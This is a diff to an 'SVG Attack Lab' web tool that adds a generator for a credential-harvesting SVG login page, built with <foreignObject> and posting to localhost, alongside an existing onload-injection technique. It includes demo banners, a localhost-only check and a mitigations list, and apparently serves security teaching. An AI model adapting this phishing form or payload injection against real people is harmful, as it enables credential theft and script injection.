@@ -204,18 +204,17 @@
   .badge-dom    { background: #1a3a2e; color: var(--green);  border: 1px solid #204a36; }
   .badge-xxe    { background: #2e2a1a; color: var(--yellow); border: 1px solid #4a3c14; }
   .badge-csrf   { background: #2a1a3a; color: #c080ff;       border: 1px solid #402060; }
+  .badge-phish  { background: #1a2a1a; color: #50e090;       border: 1px solid #205030; }
 
   [data-theme="light"] .badge-xss    { background: #ffe5e5; color: #c02020; }
   [data-theme="light"] .badge-exfil  { background: #e5f0ff; color: #1040a0; }
   [data-theme="light"] .badge-dom    { background: #e5fff0; color: #106030; }
   [data-theme="light"] .badge-xxe    { background: #fff8e5; color: #806010; }
   [data-theme="light"] .badge-csrf   { background: #f5e5ff; color: #601080; }
+  [data-theme="light"] .badge-phish  { background: #e5fff0; color: #106030; }
 
-  [data-theme="eye"] .badge-xss   { background: #2a1a00; color: #e8a020; border-color: #5a3a10; }
-  [data-theme="eye"] .badge-exfil { background: #1a2a0a; color: #80c040; border-color: #304a14; }
-  [data-theme="eye"] .badge-dom   { background: #0a2a20; color: #60d0a0; border-color: #104a30; }
-  [data-theme="eye"] .badge-xxe   { background: #2a2000; color: #f0c840; border-color: #4a3c10; }
   [data-theme="eye"] .badge-csrf  { background: #201a30; color: #c0a0f0; border-color: #3a2850; }
+  [data-theme="eye"] .badge-phish { background: #0a2a14; color: #60e090; border-color: #104a20; }
 
   .tech-name {
     font-size: 14px;
@@ -597,6 +596,17 @@
       </div>
     </div>
 
+    <div class="tech-card" onclick="selectTech('svg_phishing')" id="card-svg_phishing">
+      <div class="tech-badge badge-phish">PHISHING</div>
+      <div class="tech-name">SVG Phishing Login Page</div>
+      <div class="tech-desc">SVG embeds a full HTML login form via &lt;foreignObject&gt;. Credentials are POSTed to a listener. Bypasses link scanners that only inspect href targets.</div>
+      <div class="tech-severity">
+        <div class="sev-dot lit"></div><div class="sev-dot lit"></div><div class="sev-dot lit"></div>
+        <div class="sev-dot lit"></div><div class="sev-dot lit"></div>
+        <span style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono)">⚠ Demo Only</span>
+      </div>
+    </div>
+
   </div>
 
   <!-- TECHNIQUE DETAIL -->
@@ -709,6 +719,149 @@
 
   </div>
 
+  <!-- PHISHING SPECIAL PANEL -->
+  <div id="phishing-panel" style="display:none;margin-top:0">
+
+    <!-- BIG DEMO WARNING -->
+    <div style="background:#1a0a00;border:2px solid #ff6b00;border-radius:10px;padding:18px 22px;margin-bottom:18px;display:flex;gap:14px;align-items:flex-start">
+      <span style="font-size:26px;flex-shrink:0">🚨</span>
+      <div style="font-family:var(--mono);font-size:12px;line-height:1.8">
+        <div style="color:#ff6b00;font-weight:700;font-size:14px;margin-bottom:6px">DEMO MODE — LOCALHOST ONLY</div>
+        <span style="color:var(--text)">This phishing demo <strong>only sends credentials to your own machine (localhost)</strong>.<br>
+        The generated SVG contains a fake login page for a <strong>made-up silly company</strong> clearly labelled as a security demo.<br>
+        To capture submitted creds, run a local HTTP server in your terminal:<br><br></span>
+        <span style="color:#39d98a;background:#001a0a;padding:6px 12px;border-radius:5px;display:inline-block;letter-spacing:0.5px">
+          python3 -m http.server &lt;YOUR_PORT&gt;
+        </span><br><br>
+        <span style="color:var(--muted)">Then enter your chosen port below. The SVG will POST form data to <code style="color:#4f8ef7">http://localhost:PORT/phish</code></span>
+      </div>
+    </div>
+
+    <!-- PORT INPUT + GENERATE -->
+    <div class="panel" style="margin-bottom:20px">
+      <div class="panel-header">
+        <span class="panel-title">🎣 SVG Phishing Demo Generator</span>
+      </div>
+      <div class="panel-body">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+          <div>
+            <div style="font-size:11px;color:var(--muted);font-family:var(--mono);margin-bottom:6px">Your Localhost Port</div>
+            <input type="number" id="phish-port" value="8080" min="1024" max="65535"
+              style="width:100%;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--mono);font-size:13px;padding:9px 12px;outline:none"
+              placeholder="e.g. 8080">
+            <div style="font-size:10px;color:var(--muted);font-family:var(--mono);margin-top:4px">Run: python3 -m http.server 8080</div>
+          </div>
+          <div>
+            <div style="font-size:11px;color:var(--muted);font-family:var(--mono);margin-bottom:6px">Fake Company Name</div>
+            <input type="text" id="phish-company" value="BananaCorp™ Portal" readonly
+              style="width:100%;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:#50e090;font-family:var(--mono);font-size:13px;padding:9px 12px;outline:none;cursor:not-allowed"
+              title="Company name is fixed as a silly placeholder to prevent realistic impersonation">
+            <div style="font-size:10px;color:var(--muted);font-family:var(--mono);margin-top:4px">Fixed silly name — cannot be changed (by design)</div>
+          </div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="generatePhishSVG()">🎣 Generate Phishing SVG</button>
+          <button class="btn btn-secondary" onclick="previewPhishSVG()">👁 Preview Page</button>
+          <button class="btn btn-green" onclick="downloadPhishSVG()">⬇ Download SVG</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- OUTPUT SIDE BY SIDE -->
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+
+      <div class="panel">
+        <div class="tab-row">
+          <div class="tab active" id="phish-tab-view" onclick="switchPhishTab('view')">View Source</div>
+          <div class="tab" id="phish-tab-edit" onclick="switchPhishTab('edit')">✏ Edit SVG</div>
+        </div>
+
+        <!-- VIEW mode -->
+        <div id="phish-view-pane" class="panel-body">
+          <div class="output-box" id="phish-output" style="min-height:300px">
+            <span style="color:var(--muted)">// Click Generate to build the SVG...</span>
+          </div>
+          <div class="btn-row" style="margin-top:10px">
+            <button class="btn btn-secondary" onclick="copyPhishOutput()">Copy SVG</button>
+            <button class="btn btn-secondary" onclick="switchPhishTab('edit')">✏ Edit</button>
+          </div>
+        </div>
+
+        <!-- EDIT mode -->
+        <div id="phish-edit-pane" class="panel-body" style="display:none">
+          <div style="font-size:11px;color:var(--yellow);font-family:var(--mono);margin-bottom:8px;
+                      background:#2a2000;border:1px solid #4a3800;padding:7px 10px;border-radius:5px;">
+            ⚠ Edit mode — modify demo text, layout, or port references.
+            The <strong>localhost-only</strong> constraint and <strong>DEMO banners</strong>
+            must not be removed. Click Apply to rebuild preview.
+          </div>
+          <textarea id="phish-edit-textarea" class="svg-textarea"
+            style="min-height:280px;font-size:11px"
+            placeholder="Generate an SVG first, then edit it here..."></textarea>
+          <div class="btn-row" style="margin-top:10px">
+            <button class="btn btn-primary" onclick="applyPhishEdit()">✅ Apply Changes</button>
+            <button class="btn btn-secondary" onclick="resetPhishEdit()">↩ Reset to Generated</button>
+            <button class="btn btn-secondary" onclick="copyPhishOutput()">Copy</button>
+          </div>
+          <div id="phish-edit-warn" style="display:none;margin-top:8px;font-size:11px;
+               color:var(--accent);font-family:var(--mono);background:#2a0808;
+               border:1px solid #5a1010;padding:7px 10px;border-radius:5px"></div>
+        </div>
+
+        <div class="status-bar">
+          <div class="status-dot ready"></div>
+          <span id="phish-status">Ready</span>
+          &nbsp;|&nbsp;
+          <span id="phish-mode-label" style="color:var(--muted)">view mode</span>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">What This Demonstrates</span></div>
+        <div class="panel-body" style="font-family:var(--mono);font-size:12px;line-height:1.9;color:var(--text)">
+          <span style="color:var(--accent);font-weight:700">[ ATTACK EXPLANATION ]</span><br><br>
+          SVG phishing abuses the <span style="color:var(--blue)">&lt;foreignObject&gt;</span> tag to embed
+          a complete HTML login form inside an SVG file.<br><br>
+          <span style="color:var(--yellow)">Why it's dangerous:</span><br>
+          • Email scanners inspect link <em>destinations</em>, not SVG internals<br>
+          • A .svg attachment bypasses many content filters<br>
+          • Looks like a legitimate image attachment<br>
+          • Form submits silently to attacker server<br>
+          • No redirect — victim stays on the "page"<br><br>
+          <span style="color:var(--yellow)">Real-world chain:</span><br>
+          Email → SVG attachment → User opens → Sees login form → Submits creds → Attacker captures<br><br>
+          <span style="color:var(--green);font-weight:700">[ MITIGATIONS ]</span><br>
+          • Block SVG attachments in email gateways<br>
+          • Scan SVG content for &lt;foreignObject&gt;<br>
+          • User awareness training<br>
+          • MFA so stolen passwords alone are useless<br>
+          • Browser isolation / sandboxed SVG rendering<br><br>
+          <span style="color:var(--muted)">Creds captured by YOUR local python server only.</span>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- HOW TO USE GUIDE -->
+    <div style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:16px 20px;margin-top:18px;font-family:var(--mono);font-size:12px;line-height:1.9">
+      <div style="color:var(--green);font-weight:700;margin-bottom:8px">📖 HOW TO RUN THIS DEMO (Students / Researchers)</div>
+      <span style="color:var(--text)">
+        <span style="color:var(--accent)">Step 1</span> — Open a terminal and run:<br>
+        &nbsp;&nbsp;<span style="background:var(--bg);padding:2px 8px;border-radius:4px;color:#4f8ef7">python3 -m http.server 8080</span>
+        &nbsp; (or any port you like)<br><br>
+        <span style="color:var(--accent)">Step 2</span> — Enter that same port number in the field above, then click <strong>Generate</strong>.<br><br>
+        <span style="color:var(--accent)">Step 3</span> — Click <strong>Download SVG</strong> and open the file in your browser.<br><br>
+        <span style="color:var(--accent)">Step 4</span> — Fill in the fake login form and hit Submit.<br><br>
+        <span style="color:var(--accent)">Step 5</span> — Watch your terminal — the POST request with credentials will appear in the server log.<br><br>
+        <span style="color:var(--muted)">Note: Browser CORS policy blocks cross-origin POST from file:// in some browsers.
+        For best results serve the SVG via your local server too: place it in the same folder and open
+        <span style="color:#4f8ef7">http://localhost:8080/phish-demo.svg</span></span>
+      </span>
+    </div>
+
+  </div>
+
 </div>
 
 <footer>
@@ -779,8 +932,215 @@ const TECHNIQUES = {
       const safe = stripRootAttrs(svg, ['onload','onclick','onerror']);
       return safe.replace(/(<svg[^>]*)>/, `$1 onload="${escAttr(payload)}">`);
     }
+  },
+  svg_phishing: {
+    name: 'SVG Phishing Login Page',
+    description: 'SVG files can embed complete HTML login forms using <foreignObject>. When a victim opens the SVG (as an email attachment or injected element), they see a convincing login page. Form credentials are POSTed silently to an attacker-controlled endpoint. Email security scanners often miss this because they only check link hrefs, not SVG internals.',
+    inject: () => '<!-- Phishing uses dedicated generator below -->'
   }
 };
+
+// ─────────────────────────────────────────────
+//  PHISHING SVG GENERATOR
+// ─────────────────────────────────────────────
+let phishSVGOutput = '';
+
+function buildPhishSVG(port) {
+  const target = `http://localhost:${port}/phish`;
+  return `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml"
+     width="600" height="520" viewBox="0 0 600 520">
+
+  <!-- ██ SECURITY DEMO — NOT A REAL COMPANY — FOR AUTHORIZED RESEARCH ONLY ██ -->
+  <!-- Credentials sent to: ${target} (localhost only) -->
+
+  <!-- Demo watermark background -->
+  <rect width="600" height="520" fill="#0d0f14"/>
+  <text x="300" y="270" text-anchor="middle" font-size="72" font-family="Arial"
+        fill="#ff000015" transform="rotate(-35,300,270)" font-weight="bold">DEMO</text>
+  <text x="300" y="370" text-anchor="middle" font-size="72" font-family="Arial"
+        fill="#ff000015" transform="rotate(-35,300,370)" font-weight="bold">DEMO</text>
+
+  <foreignObject x="0" y="0" width="600" height="520">
+    <xhtml:div style="margin:0;padding:0;font-family:Arial,sans-serif;background:#0d0f14;min-height:520px">
+
+      <!-- ⚠️ DEMO BANNER — always visible -->
+      <xhtml:div style="background:#7a0000;color:#fff;text-align:center;padding:6px 10px;
+                        font-size:11px;font-weight:bold;letter-spacing:1px;border-bottom:2px solid #ff4444">
+        ⚠️ THIS IS A SECURITY RESEARCH DEMO — NOT A REAL LOGIN PAGE ⚠️
+      </xhtml:div>
+
+      <!-- Fake company header -->
+      <xhtml:div style="background:#141720;padding:22px;text-align:center;border-bottom:1px solid #2a3050">
+        <xhtml:div style="font-size:28px;margin-bottom:4px">🍌</xhtml:div>
+        <xhtml:div style="color:#50e090;font-size:20px;font-weight:bold">BananaCorp™ Portal</xhtml:div>
+        <xhtml:div style="color:#7a82a0;font-size:11px;margin-top:3px">
+          Definitely Real Enterprise Solutions Inc.
+        </xhtml:div>
+      </xhtml:div>
+
+      <!-- Login form -->
+      <xhtml:div style="padding:28px 40px">
+        <xhtml:div style="color:#e8eaf2;font-size:15px;font-weight:bold;margin-bottom:18px;text-align:center">
+          Sign in to your account
+        </xhtml:div>
+
+        <xhtml:form method="POST" action="${target}" style="margin:0"
+          onsubmit="this.querySelector('.submit-btn').textContent='Sending to localhost...';return true;">
+
+          <xhtml:div style="margin-bottom:14px">
+            <xhtml:label style="color:#7a82a0;font-size:11px;display:block;margin-bottom:5px;
+                                font-family:monospace;letter-spacing:0.5px">EMAIL / USERNAME</xhtml:label>
+            <xhtml:input type="text" name="username" placeholder="you@bananacorp.fake"
+              style="width:100%;padding:10px 12px;background:#1a1e2e;border:1px solid #2a3050;
+                     border-radius:6px;color:#e8eaf2;font-size:13px;box-sizing:border-box;outline:none"
+              onfocus="this.style.borderColor='#50e090'" onblur="this.style.borderColor='#2a3050'"/>
+          </xhtml:div>
+
+          <xhtml:div style="margin-bottom:20px">
+            <xhtml:label style="color:#7a82a0;font-size:11px;display:block;margin-bottom:5px;
+                                font-family:monospace;letter-spacing:0.5px">PASSWORD</xhtml:label>
+            <xhtml:input type="password" name="password" placeholder="••••••••••"
+              style="width:100%;padding:10px 12px;background:#1a1e2e;border:1px solid #2a3050;
+                     border-radius:6px;color:#e8eaf2;font-size:13px;box-sizing:border-box;outline:none"
+              onfocus="this.style.borderColor='#50e090'" onblur="this.style.borderColor='#2a3050'"/>
+          </xhtml:div>
+
+          <xhtml:input type="hidden" name="_demo" value="SVGAttackLab-ResearchOnly"/>
+          <xhtml:input type="hidden" name="_target" value="${target}"/>
+
+          <xhtml:button type="submit" class="submit-btn"
+            style="width:100%;padding:11px;background:#50e090;border:none;border-radius:6px;
+                   color:#0d0f14;font-size:14px;font-weight:bold;cursor:pointer;font-family:Arial">
+            Sign In
+          </xhtml:button>
+
+        </xhtml:form>
+
+        <!-- Demo notice inside form area too -->
+        <xhtml:div style="margin-top:16px;background:#1a0808;border:1px solid #5a2020;border-radius:6px;
+                          padding:10px 12px;font-size:10px;color:#e06060;font-family:monospace;line-height:1.6">
+          🔬 DEMO: Creds POST to <xhtml:strong style="color:#ff8080">localhost:${port}/phish</xhtml:strong> only.
+          Run: <xhtml:code style="background:#0d0000;padding:1px 5px;border-radius:3px">
+            python3 -m http.server ${port}
+          </xhtml:code> to capture.
+        </xhtml:div>
+      </xhtml:div>
+
+      <!-- Footer -->
+      <xhtml:div style="text-align:center;padding:10px;color:#3a4060;font-size:10px;font-family:monospace">
+        SVG Attack Lab — Authorized Security Research Only — Made by Aryan Giri
+      </xhtml:div>
+
+    </xhtml:div>
+  </foreignObject>
+</svg>`;
+}
+
+function generatePhishSVG() {
+  const port = parseInt(document.getElementById('phish-port').value) || 8080;
+  if (port < 1024 || port > 65535) {
+    alert('Port must be between 1024 and 65535.');
+    return;
+  }
+  phishSVGOutput = buildPhishSVG(port);
+  document.getElementById('phish-output').innerHTML = syntaxHighlight(phishSVGOutput);
+  document.getElementById('phish-edit-textarea').value = phishSVGOutput;
+  document.getElementById('phish-status').textContent =
+    `SVG generated — targeting localhost:${port}`;
+  document.getElementById('phish-edit-warn').style.display = 'none';
+}
+
+// ── Phishing tab switcher ──
+function switchPhishTab(tab) {
+  const isEdit = tab === 'edit';
+  document.getElementById('phish-view-pane').style.display = isEdit ? 'none' : 'block';
+  document.getElementById('phish-edit-pane').style.display = isEdit ? 'block' : 'none';
+  document.getElementById('phish-tab-view').classList.toggle('active', !isEdit);
+  document.getElementById('phish-tab-edit').classList.toggle('active', isEdit);
+  document.getElementById('phish-mode-label').textContent = isEdit ? 'edit mode' : 'view mode';
+  if (isEdit && !document.getElementById('phish-edit-textarea').value && phishSVGOutput) {
+    document.getElementById('phish-edit-textarea').value = phishSVGOutput;
+  }
+}
+
+// ── Apply edits with safety checks ──
+function applyPhishEdit() {
+  const edited = document.getElementById('phish-edit-textarea').value;
+  const warnEl = document.getElementById('phish-edit-warn');
+
+  if (!edited.trim()) {
+    warnEl.textContent = '✖ Cannot apply — textarea is empty.';
+    warnEl.style.display = 'block'; return;
+  }
+
+  const warnings = [];
+
+  // Safety checks — demo banners and localhost constraint must remain
+  if (!/localhost/i.test(edited))
+    warnings.push('⚠ "localhost" removed — payload must only target localhost.');
+  if (!/DEMO|demo/i.test(edited))
+    warnings.push('⚠ DEMO label appears to be removed — demo banners must stay.');
+  if (!/SECURITY RESEARCH DEMO/i.test(edited))
+    warnings.push('⚠ "SECURITY RESEARCH DEMO" warning banner missing.');
+  if (/action=["']https?:\/\/(?!localhost)/i.test(edited))
+    warnings.push('✖ BLOCKED — form action points to an external host. Only localhost is allowed.');
+
+  // Hard block on external host in action
+  if (/action=["']https?:\/\/(?!localhost)/i.test(edited)) {
+    warnEl.innerHTML = warnings.join('<br>');
+    warnEl.style.display = 'block';
+    return;
+  }
+
+  phishSVGOutput = edited;
+  // Switch to view and re-render highlight
+  switchPhishTab('view');
+  document.getElementById('phish-output').innerHTML = syntaxHighlight(phishSVGOutput);
+  document.getElementById('phish-status').textContent = 'Custom edits applied';
+
+  if (warnings.length) {
+    warnEl.innerHTML = warnings.join('<br>');
+    warnEl.style.display = 'block';
+  } else {
+    warnEl.style.display = 'none';
+  }
+}
+
+// ── Reset edit textarea to last generated SVG ──
+function resetPhishEdit() {
+  if (!phishSVGOutput) { alert('Generate an SVG first.'); return; }
+  document.getElementById('phish-edit-textarea').value = phishSVGOutput;
+  document.getElementById('phish-edit-warn').style.display = 'none';
+  document.getElementById('phish-status').textContent = 'Reset to generated SVG';
+}
+
+function previewPhishSVG() {
+  if (!phishSVGOutput) { generatePhishSVG(); }
+  const blob = new Blob([phishSVGOutput], { type: 'image/svg+xml' });
+  const url = URL.createObjectURL(blob);
+  window.open(url, '_blank');
+}
+
+function downloadPhishSVG() {
+  if (!phishSVGOutput) { generatePhishSVG(); }
+  const blob = new Blob([phishSVGOutput], { type: 'image/svg+xml' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'phish-demo-bananacorp.svg';
+  a.click();
+}
+
+function copyPhishOutput() {
+  const inEditMode = document.getElementById('phish-edit-pane').style.display !== 'none';
+  const text = inEditMode
+    ? document.getElementById('phish-edit-textarea').value
+    : phishSVGOutput;
+  if (!text) { alert('Generate first.'); return; }
+  navigator.clipboard.writeText(text).then(() => {
+    document.getElementById('phish-status').textContent = 'Copied to clipboard!';
+    setTimeout(() => document.getElementById('phish-status').textContent = 'Ready', 2000);
+  });
+}
 
 // ─────────────────────────────────────────────
 //  TEMPLATES
@@ -831,7 +1191,10 @@ function selectTech(key) {
   document.getElementById('tech-detail').classList.add('visible');
 
   document.getElementById('no-select-msg').style.display = 'none';
-  document.getElementById('workspace').style.display = 'grid';
+
+  const isPhishing = key === 'svg_phishing';
+  document.getElementById('workspace').style.display = isPhishing ? 'none' : 'grid';
+  document.getElementById('phishing-panel').style.display = isPhishing ? 'block' : 'none';
 
   setStatus(true, 'Technique selected: ' + t.name);
 }
